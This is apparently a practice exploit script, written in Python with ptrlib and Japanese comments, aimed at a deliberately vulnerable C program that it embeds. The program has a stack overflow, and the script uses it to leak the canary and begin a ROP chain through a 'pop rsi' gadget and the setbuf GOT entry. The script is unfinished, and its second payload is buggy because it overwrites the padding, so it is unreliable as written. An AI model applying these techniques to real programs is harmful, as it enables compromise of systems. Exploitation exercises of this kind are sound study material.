from ptrlib import *

# canaryのリーク
def canary_leak(elf, proc):
    print("canary_leak")
    payload = b'P' * 0x10
    payload += b'P' * 8
    payload += b'P' # カナリー一歩手前
    proc.sendafter("Input (1/4) >> ", payload)
    proc.recv(len("Output : ") + len(payload)) # ゴミ
    leaked = proc.recv(7)
    leaked_canary = int.from_bytes(leaked, byteorder='little')
    return (leaked_canary * 0x100)


def main():
    """
```
<< EOF cat | gcc -static-pie -z lazy -o hard -x c -
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char msg[0x10] = {};

    setbuf(stdout, NULL);

    puts("You can put message 4 times");
    for (int i = 0; i < 4; i++) {
        printf("Input (%d/4) >> ", i + 1);
        read(STDIN_FILENO, msg, 0x70);
        printf("Output : %s\n", msg);
    }
    puts("Bye!");

    return 0;
}
// gcc hard.c -static-pie -o hard
EOF
```
    """
    elf = ELF("./hard")
    proc = Process("./hard")

    input()
    print("leaked_canary", hex(canary_leak(elf, proc)))

    addr_setbuf_got = elf.symbol("setbuf") # got addrを調べる

    payload = b'Q' * 0x10
    payload += b'Q' * 8
    payload = p64(next(elf.gadget("pop rsi;")))
    payload += p64(addr_setbuf_got)

    print("addr_setbuf_got", hex(addr_setbuf_got))
    proc.sendafter("Input (2/4) >> ", payload)

    proc.recv(len("Output : "))
    leaked = proc.recv(4)
    print("leaked", leaked)

    proc.interactive()

if __name__ == "__main__":
    main()
